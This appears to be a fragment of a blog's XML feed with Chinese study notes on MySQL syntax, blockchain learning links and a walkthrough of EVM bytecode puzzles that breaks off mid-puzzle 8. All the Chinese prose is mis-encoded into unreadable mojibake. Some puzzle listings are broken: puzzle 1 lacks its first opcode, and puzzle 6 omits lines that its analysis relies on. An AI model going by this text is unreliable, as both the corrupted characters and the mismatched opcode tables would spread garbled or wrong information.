ç±»å‹ï¼ˆé•¿åº¦ï¼‰[COMMENT æ³¨é‡Š] [çº¦æŸ ]ï¼›</li></ul></li><li>åˆ é™¤å­—æ®µ : ALTER TABLE è¡¨å DROP å­—æ®µåï¼›</li><li>ä¿®æ”¹è¡¨å ï¼šALTER TABLE è¡¨å RENAME TO æ–°è¡¨åï¼›</li><li>åˆ é™¤ï¼š<ul><li>åˆ é™¤è¡¨ ï¼šDROP TABLE [IF EXISTS]è¡¨åï¼›</li><li>åˆ é™¤æŒ‡å®šè¡¨ï¼Œå¹¶é‡æ–°åˆ›å»ºè¯¥è¡¨ : TRUNCATE TABLE è¡¨åï¼›ï¼ˆä¸€èˆ¬ä¸ä½¿ç”¨å®ƒï¼Œå› ä¸ºå®ƒä¼šé‡æ–°åˆ›å»ºè¯¥è¡¨ï¼Œåªæ˜¯æ²¡æœ‰ç»“æ„ï¼‰<br>MySQL å›¾å½¢åŒ–ç•Œé¢ï¼šDataGrip,ä½¿ç”¨å®ƒå°±å¯ä»¥ç›´æ¥å†™äº†</li></ul></li></ul><hr><h5 id="DML"><a href="#DML" class="headerlink" title="DML"></a>DML</h5><p>2ï¼ŒDMLï¼šæ•°æ®æ“ä½œè¯­è¨€ï¼Œç”¨æ¥å¯¹æ•°æ®åº“è¡¨ä¸­çš„æ•°æ®è¿›è¡Œä¿®æ”¹  æ¶‰åŠçš„å…³é”®å­—ï¼šINSERT INTO<br>a,DML-æ·»åŠ æ•°æ®ï¼š</p><ul><li>ç»™æŒ‡å®šå­—æ®µæ·»åŠ æ•°æ®ï¼šINSERT INTO è¡¨åï¼ˆå­—æ®µå1ï¼Œå­—æ®µå2â€¦ ï¼‰VALUESï¼ˆå€¼1ï¼Œå€¼2â€¦ï¼‰ï¼›</li><li>ç»™å…¨éƒ¨å­—æ®µæ·»åŠ æ•°ï¼šINSERT INTO è¡¨å VALUESï¼ˆå€¼1ï¼Œå€¼2â€¦ï¼‰ï¼›å€¼1ï¼Œå°±æ˜¯è¡¨ä¸­ç¬¬ä¸€åˆ—</li><li>æ‰¹é‡æ·»åŠ æ•°æ®ï¼š<ul><li>INSERT INTO è¡¨åï¼ˆå­—æ®µå1ï¼Œå­—æ®µå2â€¦ ï¼‰VALUESï¼ˆå€¼1ï¼Œå€¼2â€¦ï¼‰ï¼Œï¼ˆå€¼1ï¼Œå€¼2â€¦ï¼‰ï¼Œï¼ˆå€¼1ï¼Œå€¼2â€¦ï¼‰ï¼›</li><li>INSERT INTO è¡¨å VALUE(å€¼1ï¼Œå€¼2)ï¼Œï¼ˆå€¼1ï¼Œå€¼2â€¦ï¼‰ï¼ˆå€¼1ï¼Œå€¼2â€¦ï¼‰ï¼›<br>bï¼ŒDML-ä¿®æ”¹æ•°æ®</li></ul></li><li>UPDATE è¡¨å SET å­—æ®µå1 &#x3D; å€¼1ï¼Œå­—æ®µå2 &#x3D; å€¼2ï¼Œâ€¦[WHERE æ¡ä»¶]ï¼›<br>c,DML-åˆ é™¤æ•°æ®</li><li>DELETE FROM è¡¨å [WHERE æ¡ä»¶]ï¼›</li></ul><hr><h5 id="DQL"><a href="#DQL" class="headerlink" title="DQL"></a>DQL</h5><p>3ï¼ŒDQLï¼šæ•°æ®æŸ¥è¯¢è¯­è¨€ï¼Œç”¨æ¥æŸ¥è¯¢æ•°æ®åº“ä¸­çš„è¡¨çš„è®°å½•   æ¶‰åŠçš„å…³é”®å­—ï¼šSELECT</p><p>a,DQL-è¯­æ³•ï¼ˆä¹Ÿæ˜¯ç¼–å†™é¡ºåºï¼‰ï¼š<br>SELECT<br>       å­—æ®µåˆ—è¡¨<br>FROM<br>       è¡¨ååˆ—è¡¨<br>WHERE<br>       æ¡ä»¶åˆ—è¡¨<br>GROUP BY<br>       åˆ†ç»„å­—æ®µåˆ—è¡¨<br>HAVING<br>       åˆ†ç»„åæ¡ä»¶åˆ—è¡¨<br>ORDER BY<br>       æ’åºå­—æ®µåˆ—è¡¨<br>LIMIT<br>       åˆ†é¡µå‚æ•°</p><p>b,DQL-åŸºæœ¬æŸ¥è¯¢</p><ul><li>æŸ¥è¯¢å¤šä¸ªå­—æ®µ<ul><li>SELECT å­—æ®µ1ï¼Œå­—æ®µ2ï¼Œå­—æ®µ3â€¦. FROM è¡¨åï¼›</li><li>SELECT *FROM è¡¨åï¼›æŸ¥è¯¢æ‰€æœ‰å­—æ®µ</li></ul></li><li>è®¾ç½®åˆ«åï¼šSELECT å­—æ®µ1[AS åˆ«å1]ï¼Œå­—æ®µ2[AS åˆ«å2]â€¦FROM è¡¨åï¼›</li><li>å»é™¤é‡å¤è®°å½•ï¼šSELECT DISTINCT å­—æ®µåˆ—è¡¨ FROM è¡¨åï¼›<br>c,DQL-æ¡ä»¶æŸ¥è¯¢</li><li>è¯­æ³•ï¼šSELECT å­—æ®µåˆ—è¡¨ FROM è¡¨å WHERE æ¡ä»¶åˆ—è¡¨ï¼›</li><li>æ¡ä»¶ï¼šwhereåé¢å¯ä»¥è·Ÿæ¯”è¾ƒè¿ç®—ç¬¦ï¼ˆ&gt;,&lt;,!&#x3D;,is NULL,BETWEEN    AND ï¼ŒIN(),LIKE å ä½ç¬¦ _ % ï¼‰å’Œé€»è¾‘è¿ç®—ç¬¦ï¼ˆAND ,&amp;&amp;,OR,||,NOT,!ï¼‰</li><li>in(),å°±æ˜¯æ‹¬å·é‡Œçš„æ¡ä»¶ä»»æ„æ»¡è¶³å…¶ä¸€å³å¯ï¼Œbetweenæœ€å°å€¼ and æœ€å¤§å€¼,like æ¨¡ç³ŠåŒ¹é… ä¸‹åˆ’çº¿_å ä¸€ä¸ªå­—ç¬¦ï¼Œç™¾åˆ†å·% håè·Ÿè°æŸ¥è°ï¼Œæœ€åä¸€ä¸ªå­—ç¬¦ï¼Œä¾‹å¦‚æŸ¥è¯¢åå­—ä¸ºä¿©ä¸ªå­—çš„å‘˜å·¥ï¼šlike â€˜_ _â€™;  ä¾‹å¦‚æŸ¥èº«ä»½è¯æœ€åä¸€ä¸ªå­—ç¬¦ä¸ºXï¼šlike â€˜%xâ€™;</li></ul><p>c,DQL-èšåˆå‡½æ•°</p><ul><li>ä»‹ç»ï¼šå°†ä¸€åˆ—æ•°æ®ä½œä¸ºä¸€ä¸ªæ•´ä½“ï¼Œè¿›è¡Œçºµå‘è®¡ç®—</li><li>å¸¸è§çš„èšåˆå‡½æ•°<ul><li>count ï¼šç»Ÿè®¡æ•°é‡</li><li>max :æœ€å¤§å€¼</li><li>min : æœ€å°å€¼</li><li>avg : å¹³å‡å€¼</li><li>sum : æ±‚å’Œ</li></ul></li><li>è¯­æ³•<ul><li>SELECT èšåˆå‡½æ•°ï¼ˆå­—æ®µåˆ—è¡¨ï¼‰FROM è¡¨åï¼›</li></ul></li></ul><p>d,DQL-åˆ†ç»„æŸ¥è¯¢</p><ul><li>è¯­æ³•ï¼šSELECT å­—æ®µåˆ—è¡¨ FROM è¡¨å[WHERE æ¡ä»¶] GROUP BY åˆ†ç»„å­—æ®µå [HAVING åˆ†ç»„åè¿‡æ»¤æ¡ä»¶]ï¼›</li><li>whereä¸havingåŒºåˆ«ï¼š<ul><li>æ‰§è¡Œæ—¶æœºä¸åŒï¼šwhereæ˜¯åˆ†ç»„å‰è¿›è¡Œè¿‡æ»¤ï¼Œä¸æ»¡è¶³whereæ¡ä»¶ï¼Œä¸å‚ä¸åˆ†ç»„ï¼›è€Œhavingæ˜¯åˆ†ç»„åå¯¹ç»“æœè¿›è¡Œè¿‡æ»¤</li><li>åˆ¤æ–­æ¡ä»¶ä¸åŒï¼šwhereä¸èƒ½å¯¹èšåˆå‡½æ•°è¿›è¡Œåˆ¤æ–­ï¼Œè€Œhavingå¯ä»¥ï¼›</li><li>æ³¨æ„äº‹é¡¹ï¼šæ‰§è¡Œé¡ºåºï¼šwhere&gt;èšåˆå‡½æ•°&gt;having; åˆ†ç»„åï¼ŒæŸ¥è¯¢çš„å­—æ®µä¸€èˆ¬ä¸ºèšåˆå‡½æ•°å’Œåˆ†ç»„å­—æ®µï¼ŒæŸ¥è¯¢å…¶ä»–å­—æ®µæ— ä»»ä½•æ„ä¹‰</li></ul></li></ul><p>e,DQL-æ’åºæŸ¥è¯¢</p><ul><li>è¯­æ³•: SELECT å­—æ®µåˆ—è¡¨ FROM è¡¨å ORDER BY å­—æ®µ1 æ’åºæ–¹å¼1ï¼Œå­—æ®µ2ï¼Œæ’åºæ–¹å¼äºŒï¼›</li><li>æ’åºæ–¹å¼ï¼š<ul><li>ASC: å‡åºï¼ˆé»˜è®¤å€¼ï¼‰</li><li>DESC: é™åº</li></ul></li></ul><p>f,DQL-åˆ†é¡µæŸ¥è¯¢</p><ul><li>è¯­æ³•ï¼šSELECT å­—æ®µåˆ—è¡¨ FROM è¡¨å LIMIT èµ·å§‹ç´¢å¼•ï¼ŒæŸ¥è¯¢è®°å½•æ•°ï¼›</li><li>æ³¨æ„ï¼š<ul><li>èµ·å§‹ç´¢å¼•ä»é›¶å¼€å§‹ï¼Œèµ·å§‹ç´¢å¼• &#x3D; ï¼ˆæŸ¥è¯¢é¡µç -1ï¼‰*æ¯é¡µæ˜¾ç¤ºè®°å½•æ•°</li><li>åˆ†é¡µæŸ¥è¯¢æ˜¯æ•°æ®åº“çš„æ–¹è¨€ï¼Œä¸åŒçš„æ•°æ®åº“æœ‰ä¸åŒçš„å®ç°ï¼ŒMySQLä¸­å¼LIMIT</li><li>å¦‚æœæŸ¥è¯¢çš„æ˜¯ç¬¬ä¸€é¡µæ•°æ®ï¼Œèµ·å§‹ç´¢å¼•å¯ä»¥çœç•¥ï¼Œç›´æ¥å†™limit 10</li></ul></li></ul><p>h,DQL-æ‰§è¡Œé¡ºåº<br> FROM<br>    è¡¨ååˆ—è¡¨<br>WHERE<br>    æ¡ä»¶åˆ—è¡¨<br>GROUP BY<br>     åˆ†ç»„å­—æ®µåˆ—è¡¨<br>HAVING<br>     åˆ†ç»„åæ¡ä»¶åˆ—è¡¨<br>SELECT<br>     å­—æ®µåˆ—è¡¨<br>ORDER BY<br>     æ’åºå­—æ®µåˆ—è¡¨<br>LIMIT<br>     åˆ†é¡µå‚æ•°</p><hr><h5 id="DCL"><a href="#DCL" class="headerlink" title="DCL"></a>DCL</h5><p>4ï¼ŒDCLï¼šæ•°æ®æ§åˆ¶è¯­è¨€ï¼Œç”¨æ¥åˆ›å»ºæ•°æ®åº“ç”¨æˆ·ï¼Œæ§åˆ¶æ•°æ®åº“çš„è®¿é—®æƒé™,å°±æ˜¯æ§åˆ¶æœ‰é‚£äº›ç”¨æˆ·å¯ä»¥è®¿é—®æ•°æ®åº“</p><p>a,DCL-ç”¨æˆ·ç®¡ç†</p><ul><li>æŸ¥è¯¢ç”¨æˆ·ï¼šUSE mysql; SELECT *FROM user;</li><li>åˆ›å»ºç”¨æˆ·ï¼šCREATE USER â€˜ç”¨æˆ·åâ€˜@â€™ä¸»æœºåâ€™ IDENTIFIED BY â€˜å¯†ç â€™ï¼›</li><li>ä¿®æ”¹ç”¨æˆ·å¯†ç ï¼šALTER USER â€˜ç”¨æˆ·åâ€˜@â€™ä¸»æœºåâ€™ IDENTIFIED WITH mysql_native_password BY â€˜æ–°å¯†ç â€™ï¼›</li><li>åˆ é™¤ç”¨æˆ·ï¼šDROP USER â€˜ç”¨æˆ·åâ€˜@â€™ä¸»æœºåâ€™ï¼›</li><li>ä¸»æœºåï¼šlocalhost ä»£è¡¨åªèƒ½åœ¨å½“å‰ä¸»æœºè®¿é—®æ•°æ®åº“ï¼Œ% ä»£è¡¨å¯ä»¥åœ¨ä»»æ„ä¸»æœºä¸Šè®¿é—®æ•°æ®åº“ï¼›</li></ul><p>b,DCL-æ§åˆ¶æƒé™</p><ul><li>ALL ,ALL PRIVILEGES : æ‰€æœ‰æƒé™</li><li>SELECT : æŸ¥è¯¢æ•°æ®</li><li>INSERT ï¼šæ’å…¥æ•°æ®</li><li>UPDATE : ä¿®æ”¹æ•°æ®</li><li>DELETE : åˆ é™¤æ•°æ®</li><li>ALTER : ä¿®æ”¹è¡¨</li><li>DROP : åˆ é™¤æ•°æ®åº“ï¼Œè¡¨ï¼Œè§†å›¾</li><li>CREATE : åˆ›å»ºæ•°æ®åº“ï¼Œè¡¨</li><li>ä¸»è¦ä½¿ç”¨ï¼š<ul><li>æŸ¥è¯¢æƒé™ï¼šSHOW GRANTS FOR â€˜ç”¨æˆ·åâ€˜@â€™ä¸»æœºåâ€™ï¼›</li><li>æˆäºˆæƒé™ï¼šGRANT æˆæƒåˆ—è¡¨ ON æ•°æ®åº“å.è¡¨å TO â€˜ç”¨æˆ·åâ€˜@â€™ä¸»æœºåâ€™;</li><li>æ’¤é”€æƒé™ï¼šREVOKE æƒé™åˆ—è¡¨ ON æ•°æ®åº“å.è¡¨å FROM â€˜ç”¨æˆ·åâ€˜@â€™ä¸»æœºåâ€™ï¼›</li></ul></li></ul><hr><p>ï¼ˆç”±äºåé¢è¦å­¦ä¹ solidityï¼Œæ‰€ä»¥å°±æ²¡æœ‰å†æ›´æ–°æ•°æ®åº“åŸç†äº†ï¼‰</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>åŒºå—é“¾å…¥é—¨çŸ¥è¯†å¸¸ç”¨é“¾æ¥</title>
      <link href="/2024/08/30/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%85%A5%E9%97%A8%E7%9F%A5%E8%AF%86%E9%93%BE%E6%8E%A5/"/>
      <url>/2024/08/30/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%85%A5%E9%97%A8%E7%9F%A5%E8%AF%86%E9%93%BE%E6%8E%A5/</url>
      
        <content type="html"><![CDATA[<ul><li>æ¨èè¿™ä¸ªåšä¸»çš„æ•´ä¸ªå…¥é—¨åŒºå—é“¾çš„æ–¹å‘ï¼Œé‡Œé¢æœ‰ä¸ªæ€ç»´å¯¼å›¾ï¼Œå€¼å¾—ä¸€çœ‹.<a href="https://dukedaily.github.io/solidity-expert/cn/%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE.html">ç‚¹å‡»</a></li><li>åƒµå°¸ç¼–ç¨‹å­¦ä¹ <a href="https://cryptozombies.io/">ç‚¹å‡»</a></li><li>WTFå­¦é™¢ï¼Œå­¦ä¹  EVM ï¼Œsolidityå€¼å¾—ä¸€çœ‹.<a href="https://www.wtf.academy/">ç‚¹å‡»</a></li><li>Ethernauté¶åœºç»ƒä¹ ï¼Œ<a href="https://ethernaut.openzeppelin.com/">ç‚¹å‡»</a></li><li>damn-vulnerable-defié¶åœºç»ƒä¹ ï¼Œ<a href="https://www.damnvulnerabledefi.xyz/">ç‚¹å‡»</a></li><li>EVM PUZZLESé¢˜è§£å‚è€ƒé“¾æ¥ï¼Œ<a href="https://learnblockchain.cn/article/5533">ç‚¹å‡»1</a>  <a href="https://dukedaily.github.io/solidity-expert/cn/09_EVM%E8%AF%A6%E8%A7%A3/02-evm-puzzles.html">ç‚¹å‡»äºŒ</a></li><li>evm codeæŒ‡ä»¤é€ŸæŸ¥ <a href="https://www.evm.codes/?fork=shanghai">ç‚¹å‡»</a></li><li>æ³¨:è‡ªæ¯å‡½æ•°å°†ä¼šè¢«å¼ƒç”¨,<a href="https://eips.ethereum.org/EIPS/eip-4758">ç‚¹å‡»1</a>,<a href="https://eips.ethereum.org/EIPS/eip-6049">ç‚¹å‡»2</a></li><li><a href="https://github.com/AmazingAng/WTF-Solidity/blob/main/57_Flashloan/readme.md">é—ªç”µè´·çš„æç®€å…¥é—¨</a></li><li>å…³äºsolidityçš„ä¸€äº›åŸºæœ¬é—®é¢˜,ç”¨äºè‡ªæŸ¥ï¼Œ<a href="https://www.rareskills.io/post/solidity-interview-questions">ç‚¹å‡»</a></li><li>å°†æœ¬åœ°æ–‡ä»¶ä¸Šä¼ åˆ°githubä¸Šï¼Œ<blockquote><p>è¦æœ‰ä¸€ä¸ªè‡ªå·±æƒ³ä¸Šä¼ çš„ä»“åº“ï¼Œ<br>cd è¦ä¸Šä¼ çš„æ–‡ä»¶åï¼Œgit<br>remote add origin (sshä¸‹çš„ä»“åº“åœ°å€)ï¼Œ<br>åˆ‡æ¢åˆ†æ”¯ï¼Œä¸»è¦æ˜¯çœ‹ä»“åº“æ˜¯master,è¿˜æ˜¯main, è¿˜æ˜¯å…¶ä»–çš„åˆ†æ”¯ï¼Œgit branch -M main , åˆ‡æ¢åˆ°mainåˆ†æ”¯ä¸Š<br>ç›´æ¥ä¸Šä¼ åˆ°åˆ†æ”¯ä¸Š git push -u origin main<br>å³å¯</p></blockquote></li></ul><p>ä¸€äº›æ™ºèƒ½çš„å·¥å…·ï¼š<br><a href="https://chatgpt.com/">ChatGPT</a>;<br>è°·æ­Œå¼€å‘çš„ä¸€ä¸ªæ™ºèƒ½è½¯ä»¶ï¼š<a href="https://gemini.google.com/app">Gemini</a>ï¼›<br>ä¸€ä¸ªç¤¾åŒºçš„æ£€ç´¢é—®é¢˜ï¼š<a href="https://ethereum.stackexchange.com/">Ethereum-Stack-Exchange</a><br>ä¸€ä¸ªç¤¾åŒºçš„å…¨çƒäº¤æµå¹³å°ï¼š<a href="https://stackoverflow.com/">stackoverflow</a>;<br>webä¸€ä¸ªçŸ¥è¯†æ„å»ºå¹³å°ï¼š<a href="https://www.peeranha.io/get-started">Peerhana</a>;</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>EVM puzzle</title>
      <link href="/2024/08/30/EVM-puzzle/"/>
      <url>/2024/08/30/EVM-puzzle/</url>
      
        <content type="html"><![CDATA[<h1 id="EVM-PUZZLE"><a href="#EVM-PUZZLE" class="headerlink" title="EVM PUZZLE"></a>EVM PUZZLE</h1><p><a href="https://github.com/fvictorio/evm-puzzles">è¿è¡Œæ¸¸æˆ</a></p><h2 id="puzzle-1-CALLVALUE"><a href="#puzzle-1-CALLVALUE" class="headerlink" title="puzzle 1 CALLVALUE"></a>puzzle 1 CALLVALUE</h2><p>é¢˜ç›®ï¼š</p><pre>pc     opcode  opcode name01      38      CODESIZE02      03      SUB03      56      JUMP04      FD      REVERT05      FD      REVERT06      5B      JUMPDEST07      00      STOP08      FD      REVERT09      FD      REVERT</pre><p>è¾“å…¥æ°å½“çš„valueï¼Œä½¿å¾—é¢˜ç›®çš„ opcode æ­£ç¡®æ‰§è¡Œï¼Œç›´åˆ°æ‰§è¡ŒSTOP</p><p>åˆ†æï¼šCALLVALUEå®é™…ä¸Šå°±æ˜¯msg.value,å®ƒä¼šå°†msg.valueå­˜å‚¨åˆ°æ ˆé¡¶,è€ŒJUMPä¼šè¯»å–æ ˆé¡¶å€¼ï¼Œå¹¶è·³è½¬åˆ°ç›¸åº”çš„å­—èŠ‚åœ°å€ï¼Œç”±JUMPDESTæ‰¿æ¥,æ‰€ä»¥æˆ‘ä»¬åªéœ€è¦è®©msg.value&#x3D;&#x3D;8å³å¯</p><hr><h2 id="puzzles-2-CODESIZE"><a href="#puzzles-2-CODESIZE" class="headerlink" title="puzzles 2 CODESIZE"></a>puzzles 2 CODESIZE</h2><p>é¢˜ç›®ï¼š</p><pre>pc      opcode  opcode name00      34      CALLVALUE01      38      CODESIZE02      03      SUB03      56      JUMP04      FD      REVERT05      FD      REVERT06      5B      JUMPDEST07      00      STOP08      FD      REVERT09      FD      REVERT</pre><p>msg.valueæ˜¯å¤šå°‘ï¼Ÿ</p><p>åˆ†æï¼šCALLVALUEå­˜å‚¨å€¼åˆ°æ ˆé¡¶ï¼ŒSTACKï¼š[x]ï¼ŒCODESIZEè·å–å½“å‰EVMç¯å¢ƒä¸­çš„æ“ä½œç SIZEï¼Œæ¯ä¸ªOPCODEä¸º1byteï¼Œæˆ‘ä»¬æ­¤æ—¶å†…å­˜ä¸­å…±10ä¸ªæ“ä½œç ï¼Œå› æ­¤æ‰§è¡ŒCODESIZEåï¼Œä¼šå‘æ ˆé¡¶å­˜å…¥10ï¼ŒSTACKï¼š[10, x]ï¼ŒSUBä¼šæ‰§è¡Œå‡æ³•æ“ä½œï¼Œå¹¶å°†ç»“æœå¦‚æ ˆï¼ŒSTACKï¼š[10 - x]<br>JUMPä¼šè·³åˆ°06å­—èŠ‚ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦ 10 - x &#x3D; 6ï¼Œæ¨å¯¼å‡ºï¼šx &#x3D; 4ï¼Œå³msg.valueä¸º4</p><hr><h2 id="puzzles-3-CALLDATASIZE"><a href="#puzzles-3-CALLDATASIZE" class="headerlink" title="puzzles 3 CALLDATASIZE"></a>puzzles 3 CALLDATASIZE</h2><p>é¢˜ç›®ï¼š</p><pre>pc      opcode  opcode name00      36      CALLDATASIZE01      56      JUMP02      FD      REVERT03      FD      REVERT04      5B      JUMPDEST05      00      STOP</pre><p>calldataæ˜¯å¤šå°‘ï¼Ÿ</p><p>åˆ†æï¼šJUMPDESTè·³è½¬åˆ°04ï¼Œæ‰€ä»¥æˆ‘ä»¬åªè¦ä¿è¯calldataåˆ°sizeä¸º4å³å¯ï¼Œå†…å®¹ä¸é™ã€‚å³len(msg.data) &#x3D;&#x3D; 4,msg.data&#x3D;&#x3D;0x11223344</p><blockquote><p>è¡¥å……ï¼šä¸€ä¸ªå­—èŠ‚ä»£è¡¨8ä½äºŒè¿›åˆ¶æ•°ï¼Œä¸€ä¸ª16è¿›åˆ¶æ•°ä»£è¡¨4ä½äºŒè¿›åˆ¶æ•°ï¼Œæ‰€ä»¥ä¿©ä¸ª16è¿›åˆ¶çš„æ•°å°±ä»£è¡¨ä¸€ä¸ªå­—èŠ‚</p></blockquote><hr><h2 id="puzzles-4-XOR"><a href="#puzzles-4-XOR" class="headerlink" title="puzzles 4 XOR"></a>puzzles 4 XOR</h2><p>é¢˜ç›®ï¼š</p><pre>pc      opcode  opcode name00      34      CALLVALUE01      38      CODESIZE02      18      XOR03      56      JUMP04      FD      REVERT05      FD      REVERT06      FD      REVERT07      FD      REVERT08      FD      REVERT09      FD      REVERT0A      5B      JUMPDEST0B      00      STOP</pre><p>valueæ˜¯å¤šå°‘ï¼Ÿ</p><p>åˆ†æ:CALLVALUEè·å–æ•°å€¼åå…¥æ ˆï¼ŒSTACKï¼š[x],CODESIZEè·å–æ•°å€¼ä¸º12å…¥æ ˆï¼ŒSTACKï¼š[12, x]<br>å¼‚æˆ–æ“ä½œï¼š<br>12ï¼š0000ï¼Œ1100<br>0Aï¼š0000ï¼Œ1010<br>xï¼š 0000ï¼Œ0110 &#x3D;ã€‹6ï¼Œæ‰€ä»¥ç­”æ¡ˆä¸ºï¼š6,å³valueä¸º6</p><hr><h2 id="puzzles-5-JUPM1"><a href="#puzzles-5-JUPM1" class="headerlink" title="puzzles 5 JUPM1"></a>puzzles 5 JUPM1</h2><p>é¢˜ç›®ï¼š</p><pre>        pc      opcode      opcode name00      34          CALLVALUE01      80          DUP102      02          MUL03      610100      PUSH2 010006      14          EQ07      600C        PUSH1 0C09      57          JUMPI0A      FD          REVERT0B      FD          REVERT0C      5B          JUMPDEST0D      00          STOP0E      FD          REVERT0F      FD          REVERT</pre><p>valueæ˜¯å¤šå°‘ï¼Ÿ</p><p>åˆ†æï¼š</p><ul><li>CALLVALUEï¼ŒSTACK-&gt; [x]</li><li>DUP1ï¼šSTACK-&gt; [xï¼Œx]</li><li>MULï¼šSTACK-&gt; [mul_result]</li><li>PUSH2 0100ï¼šSTACK-&gt; [0100ï¼Œmul_result]</li><li>EQï¼šåˆ¤æ–­stack1å’Œstack2æ˜¯å¦ç›¸ç­‰ï¼Œè‹¥ç›¸ç­‰ï¼Œåˆ™æ¸…é™¤è¿™ä¸¤ä¸ªå€¼ï¼Œå¹¶å‘æ ˆé¡¶å­˜å…¥1ï¼Œå¦åˆ™å­˜å…¥0</li><li>PUSH1 0Cï¼šSTACK-&gt; [0C, 1]</li><li>JUMPIï¼šè¯»å–stack2çš„å€¼ï¼Œå¦‚æœä¸º1ï¼Œåˆ™è·³è½¬åˆ°stack1çš„ä½ç½®ï¼Œå³0Cï¼Œæ»¡è¶³æ¡ä»¶ï¼<br>å› æ­¤æˆ‘ä»¬éœ€è¦ä½¿å¾—ï¼š0100 &#x3D; x*xï¼Œ0x0100åè¿›åˆ¶ä¸º256ï¼Œæ‰€ä»¥x &#x3D; 16ï¼Œå³valueä¸º16</li></ul><hr><h2 id="puzzles-6-CALLDATALOAD"><a href="#puzzles-6-CALLDATALOAD" class="headerlink" title="puzzles 6 CALLDATALOAD"></a>puzzles 6 CALLDATALOAD</h2><p>é¢˜ç›®ï¼š</p><pre>pc      opcode  opcode name02      35        CALLDATALOAD04      FD        REVERT05      FD        REVERT06      FD        REVERT07      FD        REVERT08      FD        REVERT09      FD        REVERT0A      5B        JUMPDEST0B      00        STOP</pre><p>calldataloadæ˜¯ å¤šå°‘ï¼Ÿ</p><p>åˆ†æï¼š</p><ul><li>PUSH1 00ï¼ŒSTACKï¼šã€0x00ã€‘</li><li>CALLDATALOADï¼šè·å–inputçš„æ•°æ®ï¼Œå³calldataï¼Œå‚æ•°ä¸º0x00ï¼Œå³ä»ç¬¬00ä½ç½®å¼€å§‹åŠ è½½</li><li>JUMPæƒ³è·³è½¬åˆ°0Aå¤„ï¼Œæ‰€ä»¥calldataçš„å€¼ä¸º0x0aï¼Œå¦‚æœæˆ‘ä»¬ç›´æ¥è¾“å…¥0x0aï¼Œæ­¤æ—¶ä¼šè¢«è½¬åŒ–ä¸ºï¼ša00000000000000000000000000000000000000000000000000000000000000ï¼Œè¿™æ˜¯é”™çš„ï¼›</li><li>ç”±äºcalldataçš„æ•°å€¼æ€»ä¸º32å­—èŠ‚çš„å€æ•°ï¼Œæ‰€ä»¥æ­¤å¤„åº”è¯¥ä¸ºï¼š0x000000000000000000000000000000000000000000000000000000000000000a</li></ul><hr><h2 id="puzzles-7-EXTCODESIZE"><a href="#puzzles-7-EXTCODESIZE" class="headerlink" title="puzzles 7 EXTCODESIZE"></a>puzzles 7 EXTCODESIZE</h2><p>é¢˜ç›®ï¼š</p><pre>pc      opcode    opcode name00      36        CALLDATASIZE01      6000      PUSH1 0003      80        DUP104      37        CALLDATACOPY05      36        CALLDATASIZE06      6000      PUSH1 0008      6000      PUSH1 000A      F0        CREATE0B      3B        EXTCODESIZE0C      6001      PUSH1 010E      14        EQ0F      6013      PUSH1 1311      57        JUMPI12      FD        REVERT13      5B        JUMPDEST14      00        STOP</pre><p>calldataæ˜¯å¤šå°‘ï¼Ÿ</p><p>åˆ†æï¼šé€æ­¥åˆ†æï¼Œ</p><pre>00      36        CALLDATASIZE    # [datasize]01      6000      PUSH1 00    # [00, datasize]03      80        DUP1        # [00, 00, datasize]04      37        CALLDATACOPY     # [] dataè¢«copyåˆ°memoryä¸­ï¼Œæ ˆè¢«æ¸…ç©º05      36        CALLDATASIZE    # [datasize]06      6000      PUSH1 00        # [00, datasize]08      6000      PUSH1 00        # [00, 00, datasize]0A      F0        CREATE    # [deployed_address] æ ˆè¢«æ¸…ç©ºï¼Œä»å†…å­˜ä¸­è¯»å–æ•°æ®ï¼Œåˆ›å»ºåˆçº¦ï¼Œè¿”å›åœ°å€ 0B      3B        EXTCODESIZE    # [address_code_size] è¾“å…¥åœ°å€ï¼Œè¿”å›åˆçº¦çš„size0C      6001      PUSH1 01    # [01, address_code_size]0E      14        EQ    # [1] address_code_sizeå¿…é¡»ä¸º1ï¼Œåç»­çš„æ‰æˆç«‹0F      6013      PUSH1 1311      57        JUMPI12      FD        REVERT13      5B        JUMPDEST14      00        STOP</pre><p>å°±æ˜¯æˆ‘ä»¬ä¼ å…¥çš„æ•°æ®è¦çš„æ“ä½œç è¦è¿”å›1ï¼Œåˆ©ç”¨returnæ“ä½œç¬¦</p><pre>pc      opcode    opcode name00      6001      PUSH1 0104      F3        RETURN</pre><p>å³ msg.data &#x3D;&#x3D; 0x60016000f3</p><hr><h2 id="puzzles-8-SWAP"><a href="#puzzles-8-SWAP" class="headerlink" title="puzzles 8 SWAP"></a>puzzles 8 SWAP</h2><p>é¢˜ç›®ï¼š</p><pre>pc      opcode    opcode name00      36        CALLDATASIZE01      6000      PUSH1 0003      80        DUP104      37        CALLDATACOPY05      36        CALLDATASIZE06      6000      PUSH1 0008      6000      PUSH1 000A      F0        CREATE0B      6000      PUSH1 000D      80        DUP10E      80        DUP10F      80        DUP110      80        DUP111      94        SWAP512      5A        GAS13      F1        CALL14      6000      PUSH1 0016      14        EQ17      601B      PUSH1 1B19      57        JUMPI1A      FD        REVERT1B      5B        JUMPDEST1C      00        STOP</pre><p>calldataæ˜¯å¤šå°‘ï¼Ÿ<br>åˆ†æï¼š</p><pre>00      36        CALLDATASIZE    # [datasize]01      6000      PUSH1 00    # [00, datasize]03      80        DUP1    # [00, 00, datasize]04      37        CALLDATACOPY    # []  copyåˆ°å†…å­˜ä¸­05      36        CALLDATASIZE    # [datasize]ï¼Œç›´æ¥ç”Ÿæˆæ•°æ®ï¼Œä¸éœ€è¦æ ˆå‚æ•°06      6000      PUSH1 00    # [00, datasize]08      6000      PUSH1 00    # [00, 00, datasize]0A      F0        CREATE    # [deployed_address]0B      6000      PUSH1 00    # [00, deployed_address]0D      80        DUP1    # [00, 00, deployed_address]0E      80        DUP1    # [00, 00, 00, deployed_address]0F      80        DUP1    # [00, 00, 00, 00, deployed_address]10      80        DUP1    # [00, 00, 00, 00, 00, deployed_address]11      94        SWAP5    # [deployed_address, 00, 00, 00, 00, 00]ï¼Œå…‘æ¢1st å’Œ 6thï¼Œä½ æ²¡æœ‰çœ‹é”™1å’Œ6ï¼Œä¸æ˜¯512      5A        GAS    # [gasAvail, deployed_address, 00, 00, 00, 00, 00] // 7ä¸ªå‚æ•°13      F1        CALL    # 